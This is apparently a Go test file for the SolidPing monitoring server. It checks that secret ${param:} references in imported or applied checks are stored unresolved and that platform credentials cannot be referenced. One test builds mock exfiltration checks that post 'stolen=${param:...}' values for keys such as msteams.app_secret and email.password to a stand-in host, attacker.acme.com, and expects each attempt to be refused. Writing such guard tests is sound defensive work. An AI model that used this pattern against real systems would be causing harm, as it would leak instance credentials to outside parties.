package checks_test

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/fclairamb/solidping/server/internal/db/models"
	"github.com/fclairamb/solidping/server/internal/handlers/checks"
	"github.com/fclairamb/solidping/server/internal/paramkeys"
)

// refManifest builds a one-check document whose `body` — a key that is NOT in
// SecretFields(), which is the whole point — carries a ${param:} reference.
func refManifest(slug string) *checks.ExportDocument {
	check := manifestCheck(slug)
	check.Config = map[string]any{
		"url":    "https://sso.acme.com/token",
		"method": "POST",
		"body":   "grant_type=password&username=probe&password=${param:sso-authtest-password}",
	}

	return doc("parity-manifest", check)
}

// TestImportAndApplyStoreTheSameConfigForASecretReference is the parity proof
// spec 2026-09-11-03 asks for.
//
// Before that spec only ApplyChecks called the resolver. /import stored the
// document LITERALLY, so the same file produced two different checks depending
// on which endpoint you sent it to — and the one /import produced probed the
// target with the string "${param:…}" as its password. External tooling had to
// grow a guard refusing any document containing a reference.
//
// Byte-identical is the assertion, not "equivalent": the two endpoints take the
// same document, so anything that makes their stored configs differ is a bug
// whichever side it is on.
func TestImportAndApplyStoreTheSameConfigForASecretReference(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	svc, dbSvc, org := setupApplyService(t, true)
	ctx := t.Context()

	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID,
		paramkeys.StorageKey("sso-authtest-password"), "hunter2", true))

	importRes, err := svc.ImportChecks(ctx, org.Slug, refManifest("via-import"), false)
	r.NoError(err)
	r.Equal(1, importRes.Created)

	applyRes, err := svc.ApplyChecks(ctx, org.Slug, refManifest("via-apply"), checks.ApplyOptions{})
	r.NoError(err)
	r.Equal(1, applyRes.Created)

	storedConfig := func(slug string) string {
		row, getErr := dbSvc.GetCheckByUidOrSlug(ctx, org.UID, slug)
		r.NoError(getErr)

		blob, mErr := json.Marshal(row.Config)
		r.NoError(mErr)

		return string(blob)
	}

	viaImport := storedConfig("via-import")
	viaApply := storedConfig("via-apply")

	r.Equal(viaImport, viaApply, "the same document must store the same config through either endpoint")
	r.Contains(viaImport, "${param:sso-authtest-password}", "the REFERENCE is what is stored")
	r.NotContains(viaImport, "hunter2", "the resolved value must never reach the public config")
}

// TestImportRefusesAnUnresolvableReferenceLikeApplyDoes pins the other half of
// parity: the same 400, from both endpoints, dry run included. A document that
// /apply refuses must not be quietly accepted by /import.
func TestImportRefusesAnUnresolvableReferenceLikeApplyDoes(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	svc, dbSvc, org := setupApplyService(t, true)
	ctx := t.Context()

	// The parameter is deliberately never created.
	for _, dryRun := range []bool{true, false} {
		_, err := svc.ImportChecks(ctx, org.Slug, refManifest("broken-import"), dryRun)
		r.ErrorIsf(err, checks.ErrUnresolvedSecretRef, "import dryRun=%v must refuse", dryRun)

		_, err = svc.ApplyChecks(ctx, org.Slug, refManifest("broken-apply"),
			checks.ApplyOptions{DryRun: dryRun})
		r.ErrorIsf(err, checks.ErrUnresolvedSecretRef, "apply dryRun=%v must refuse", dryRun)
	}

	list, _, err := dbSvc.ListChecks(ctx, org.UID, &models.ListChecksFilter{})
	r.NoError(err)
	r.Empty(list, "an unresolvable reference must fail closed, before any mutation")
}

// TestReferenceSurvivesTheExportRoundTrip is the round-trip the spec says the
// structural fix restores for free: what the operator committed is what comes
// back out, with no redaction logic and no second export losing the value.
func TestReferenceSurvivesTheExportRoundTrip(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	svc, dbSvc, org := setupApplyService(t, true)
	ctx := t.Context()

	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID,
		paramkeys.StorageKey("sso-authtest-password"), "hunter2", true))

	_, err := svc.ApplyChecks(ctx, org.Slug, refManifest("round-trip"), checks.ApplyOptions{})
	r.NoError(err)

	// The read endpoint shows the reference…
	got, err := svc.GetCheck(ctx, org.Slug, "round-trip", checks.GetCheckOptions{})
	r.NoError(err)
	r.Equal(
		"grant_type=password&username=probe&password=${param:sso-authtest-password}",
		got.Config["body"],
		"GET /checks/:uid must show the reference, not the value")

	// …and so does the exporter, so the committed file round-trips.
	exported, err := svc.ExportChecks(ctx, org.Slug, checks.ListChecksOptions{})
	r.NoError(err)

	blob, err := json.Marshal(exported)
	r.NoError(err)
	r.Contains(string(blob), "${param:sso-authtest-password}")
	r.NotContains(string(blob), "hunter2", "/checks/export must never carry a resolved value")

	// Re-applying the export is a no-op: the reference is the stored value, so
	// there is nothing for the second apply to change.
	exported.Organization = "parity-manifest"

	replay, err := svc.ApplyChecks(ctx, org.Slug, exported, checks.ApplyOptions{DryRun: true})
	r.NoError(err)
	r.Equal(0, replay.Created)
}

// TestPlatformParametersAreUnreferenceable is the exfiltration guard, rewritten
// after the spec-03 audit found the first version of this protection was a
// denylist that already missed four instance credentials.
//
// Two things are asserted, over real rows in a real database:
//
//  1. An ORG-scoped platform key (the org's own wrapped encryption DEK) is not
//     reachable — it lives outside paramkeys.OrgKeyPrefix.
//  2. A SYSTEM parameter is not reachable AT ALL, whatever it is called. The
//     `${param:}` system-wide fallback is gone; `msteams.app_secret` and
//     friends were readable through it by any org admin who could write a check
//     config, and no list of names could have kept up with that table.
//
// Every key below is seeded before it is referenced, so a green run means "the
// lookup refused it", never "there was nothing there".
func TestPlatformParametersAreUnreferenceable(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	svc, dbSvc, org := setupApplyService(t, true)
	ctx := t.Context()

	// Org-scoped platform material, written exactly where the credentials
	// package writes it.
	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID, "encryption.dek", "wrapped-dek-material", true))

	// Instance-wide credentials, including the four the old denylist missed.
	for _, key := range []string{
		"msteams.app_secret", "posthog.personal_api_key", "posthog.project_api_key",
		"telegram.webhook_secret", "email.password", "server.base_url",
	} {
		r.NoError(dbSvc.SetSystemParameter(ctx, key, "instance-"+key, true))
	}

	for _, key := range []string{
		"encryption.dek", "msteams.app_secret", "posthog.personal_api_key",
		"posthog.project_api_key", "telegram.webhook_secret", "email.password",
		"server.base_url",
	} {
		exfil := manifestCheck("exfil")
		exfil.Config = map[string]any{
			"url":  "https://attacker.acme.com/collect",
			"body": "stolen=${param:" + key + "}",
		}

		_, err := svc.ApplyChecks(ctx, org.Slug, doc("parity-manifest", exfil), checks.ApplyOptions{})
		r.ErrorIsf(err, checks.ErrUnresolvedSecretRef, "${param:%s} must be unresolvable", key)
	}

	list, _, err := dbSvc.ListChecks(ctx, org.UID, &models.ListChecksFilter{})
	r.NoError(err)
	r.Empty(list, "not one exfiltration attempt may have been stored")
}

// TestAnOrgKeyThatLooksLikeAPlatformKeyStillWorks is the positive control for
// the test above, and the reason the protection is a namespace rather than a
// denylist: an org admin who creates a parameter literally called
// "encryption.dek" gets THEIR value, because it is stored somewhere else
// entirely. A denylist would have had to refuse the name; the namespace does
// not need to care.
func TestAnOrgKeyThatLooksLikeAPlatformKeyStillWorks(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	svc, dbSvc, org := setupApplyService(t, true)
	ctx := t.Context()

	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID, "encryption.dek", "PLATFORM-DEK", true))
	r.NoError(dbSvc.SetOrgParameter(
		ctx, org.UID, paramkeys.StorageKey("encryption.dek"), "the-org-own-value", true))

	check := manifestCheck("lookalike")
	check.Config = map[string]any{
		"url":  "https://example.com",
		"body": "v=${param:encryption.dek}",
	}

	_, err := svc.ApplyChecks(ctx, org.Slug, doc("parity-manifest", check), checks.ApplyOptions{})
	r.NoError(err, "an org's own key must resolve even when it shares a platform key's name")

	// And the reference — not either value — is what got stored.
	row, err := dbSvc.GetCheckByUidOrSlug(ctx, org.UID, "lookalike")
	r.NoError(err)
	r.Equal("v=${param:encryption.dek}", row.Config["body"])
}

// TestNestedReferencesAreValidatedAtWriteTime covers the gap the spec-03 audit
// found in dry run: validation used to walk only top-level config strings while
// execution recursed, so a reference inside a nested map — a gRPC check's
// `metadata`, say — passed /import, /apply and both dry runs and only failed
// later, at execution. Dry run exists precisely to not do that.
func TestNestedReferencesAreValidatedAtWriteTime(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	svc, _, org := setupApplyService(t, true)
	ctx := t.Context()

	nested := manifestCheck("grpc-nested")
	nested.Type = "grpc"
	nested.Config = map[string]any{
		"target":  "grpc.acme.com:443",
		"service": "health",
		"metadata": map[string]any{
			"authorization": "Bearer ${param:never-created}",
		},
	}

	for _, dryRun := range []bool{true, false} {
		_, err := svc.ApplyChecks(ctx, org.Slug, doc("parity-manifest", nested),
			checks.ApplyOptions{DryRun: dryRun})
		r.ErrorIsf(err, checks.ErrUnresolvedSecretRef,
			"a nested unresolvable reference must be refused (dryRun=%v)", dryRun)

		_, err = svc.ImportChecks(ctx, org.Slug, doc("parity-manifest", nested), dryRun)
		r.ErrorIsf(err, checks.ErrUnresolvedSecretRef,
			"import must refuse it too (dryRun=%v)", dryRun)
	}
}
